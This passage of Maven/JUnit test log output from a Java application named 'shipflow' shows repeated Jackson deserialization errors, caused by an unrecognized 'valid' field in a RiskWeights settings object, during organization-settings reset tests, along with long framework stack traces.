	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:52.534Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings reset to defaults by admin
2026-01-17T23:26:52.534Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.resetToDefaults(OrganizationSettingsService.java:117) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$ResetToDefaultsTests.shouldCreateDefaultTaskCategoriesOnReset(OrganizationSettingsServiceTest.java:409) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:52.539Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings reset to defaults by admin
2026-01-17T23:26:52.539Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.resetToDefaults(OrganizationSettingsService.java:117) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$ResetToDefaultsTests.shouldDeleteExistingAndCreateDefaults(OrganizationSettingsServiceTest.java:380) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
